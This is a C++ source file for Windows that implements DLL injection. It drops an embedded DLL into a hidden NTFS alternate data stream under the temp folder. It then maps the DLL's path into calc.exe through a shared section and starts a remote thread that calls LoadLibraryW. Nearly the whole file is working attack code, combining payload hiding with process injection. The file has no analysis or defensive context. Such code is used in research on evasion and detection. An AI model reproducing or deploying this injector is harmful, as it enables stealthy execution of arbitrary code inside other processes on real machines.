#pragma comment(lib, "Shlwapi.lib")
#include <Shlwapi.h>

#include <windows.h>
#include <stdio.h>
#include "resource.h"
#include "ntddk.h"

#include "createproc.h"
#include "enumproc.h"
#include "target_util.h"

BYTE* get_raw_payload(OUT SIZE_T &res_size)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return NULL;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return NULL;

    BYTE* res_data = (BYTE*) LockResource(res_handle);
    res_size = SizeofResource(NULL, res);

    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(out_buf, res_data, res_size);

    FreeResource(res_handle);
    return out_buf;
}

BOOL write_to_file(BYTE* res_data, DWORD res_size, WCHAR* payloadName)
{
    HANDLE hFile = CreateFile(payloadName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);
    if (hFile == NULL) return FALSE;

    DWORD written = 0;
    BOOL isDropped = WriteFile(hFile, res_data, res_size, &written, NULL);
    CloseHandle(hFile);

    if (isDropped == TRUE) {
        if (res_size != written) { //failed to write full buffer
            DeleteFile(payloadName);
            return FALSE;
        }
    }
    return TRUE;
}

PVOID map_code_into_process(HANDLE hProcess, LPBYTE shellcode, SIZE_T shellcodeSize)
{
    HANDLE hSection = NULL;
    OBJECT_ATTRIBUTES hAttributes;
    memset(&hAttributes, 0, sizeof(OBJECT_ATTRIBUTES));

    LARGE_INTEGER maxSize;
    maxSize.HighPart = 0;
    maxSize.LowPart = shellcodeSize;
    NTSTATUS status = NULL;
    if ((status = ZwCreateSection( &hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
    {
        printf("[ERROR] ZwCreateSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section handle: %x\n", hSection);

    PVOID sectionBaseAddress = NULL;
    SIZE_T viewSize = 0;
    SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE

    // map the section in context of current process:
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(), &sectionBaseAddress, NULL, NULL, NULL, &viewSize, inheritDisposition, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }
    printf("Section BaseAddress: %p\n", sectionBaseAddress);

    memcpy (sectionBaseAddress, shellcode, shellcodeSize);
    printf("Shellcode copied!\n");

    //map the new section into context of opened process
    PVOID sectionBaseAddress2 = NULL;
    if ((status = NtMapViewOfSection(hSection, hProcess, &sectionBaseAddress2, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
    {
        printf("[ERROR] NtMapViewOfSection failed, status : %x\n", status);
        return NULL;
    }

    //unmap from the context of current process
    ZwUnmapViewOfSection(GetCurrentProcess(), sectionBaseAddress);
    ZwClose(hSection);

    printf("Section mapped at address: %p\n", sectionBaseAddress2);
    return sectionBaseAddress2;
}

bool drop_dll_to_dir(WCHAR* inject_path)
{
    BYTE* res_data = NULL;
    SIZE_T res_size = 0;

    if ((res_data = get_raw_payload(res_size)) == NULL) {
        printf("Failed!\n");
        return false;
    } 
    printf("inject_path = %S\n", inject_path);

    //drop the DLL on the disk:
    if (!write_to_file(res_data, res_size, inject_path)) return false;
    return true;
}

HANDLE get_target()
{
    WCHAR target_name[] = L"calc.exe";
    HANDLE hProcess = find_running_process(target_name);
    if (hProcess != NULL) {
        return hProcess;
    }
        
    WCHAR target_path[MAX_PATH];
    get_calc_path(target_path, MAX_PATH);
    PROCESS_INFORMATION pi;
    memset(&pi,0, sizeof(PROCESS_INFORMATION));
    create_new_process1(target_path, pi);
    if (pi.hProcess == NULL) {
        return NULL;
    }
    hProcess = pi.hProcess;
    ResumeThread(pi.hThread); //optional
    return hProcess;
}

int main(int argc, char *argv[])
{
    HANDLE hProcess = get_target();
    if (!hProcess) {
        printf("Could not fetch the target\n");
        system("pause");
        return -1;
    }

    //buffer to store the full path:
    WCHAR inject_path[MAX_PATH];

    //we will drop the dll into ADS:
    WCHAR my_lib[] = L"log.txt:hidden_dll";
    
    WCHAR dir_path[MAX_PATH];
    GetTempPath(MAX_PATH, dir_path);
    PathCombine(inject_path, dir_path, my_lib);

    if (!drop_dll_to_dir(inject_path)) return -1;

    //we need to write the full path of the DLL into the remote process:
    PVOID remote_ptr = map_code_into_process(hProcess, (BYTE*)inject_path, sizeof(inject_path));
    printf("Path writen to: %p\n", remote_ptr);

    HMODULE hModule = GetModuleHandle(L"kernel32.dll");
    if (!hModule) return -1;

    FARPROC hLoadLib = GetProcAddress(hModule, "LoadLibraryW");
    if (!hLoadLib) return -1;

    // Inject to the other process:
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hLoadLib, remote_ptr, NULL, NULL);
    if(hRemoteThread == NULL) {
        //injection failed, delete the dropped dll:
        DeleteFile(inject_path);
    }

    system("pause");
    return 0;
}
